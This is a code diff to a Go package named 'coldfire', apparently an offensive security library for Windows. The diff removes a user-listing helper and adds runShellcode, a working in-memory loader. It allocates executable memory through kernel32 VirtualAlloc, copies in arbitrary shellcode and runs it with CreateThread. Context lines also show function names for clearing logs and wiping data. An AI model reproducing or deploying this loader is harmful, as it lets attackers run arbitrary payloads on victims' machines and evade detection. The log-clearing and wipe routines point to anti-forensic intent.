@@ -5,7 +5,8 @@ package coldfire
 
 import (
 	"os"
-	"strings"
+	"syscall"
+	"unsafe"
 )
 
 func shutdown() error {
@@ -13,35 +14,6 @@ func shutdown() error {
 	_, err := cmdOut(c)
 
 	return err
-}
-
-func users() ([]string, error) {
-	clear := []string{}
-	o, err := cmdOut("net user")
-	if err != nil {
-		return nil, err
-	}
-
-	lines := strings.Split(o, "\n")
-
-	for l := range lines {
-		line := lines[l]
-		if !ContainsAny(line, []string{"accounts for", "------", "completed"}) {
-			clear = append(clear, line)
-		}
-	}
-
-	return clear, nil
-	// return strings.Fields(strings.Join(clear, " ")), nil
-	// usrs := []string{}
-	//   users, err := wapi.ListLoggedInUsers()
-	//   if err != nil {
-	//       return nil, err
-	//   }
-	//   for _, u := range(users){
-	//       usrs = append(usrs, u.FullUser())
-	//   }
-	//   return usrs, nil
 }
 
 func clearLogs() error {
@@ -62,6 +34,24 @@ func wipe() error {
 	}
 
 	return nil
+}
+
+func runShellcode(sc []byte, bg bool){
+	var bg_run uintptr = 0x00
+	if (bg) {
+		bg_run = 0x00000004
+	}
+	kernel32 := syscall.MustLoadDLL("kernel32.dll")
+	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
+	procCreateThread := kernel32.MustFindProc("CreateThread")
+	waitForSingleObject := kernel32.MustFindProc("WaitForSingleObject")
+	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x2000|0x1000, syscall.PAGE_EXECUTE_READWRITE)
+	ptr := (*[990000]byte)(unsafe.Pointer(addr))
+	for i, value := range sc {
+		ptr[i] = value
+	}
+	threadHandle, _, _ := procCreateThread.Call(0, 0, addr, 0, bg_run, 0)
+	waitForSingleObject.Call(threadHandle, uintptr(^uint(0)))
 }
 
 // func dialog(message, title string) {
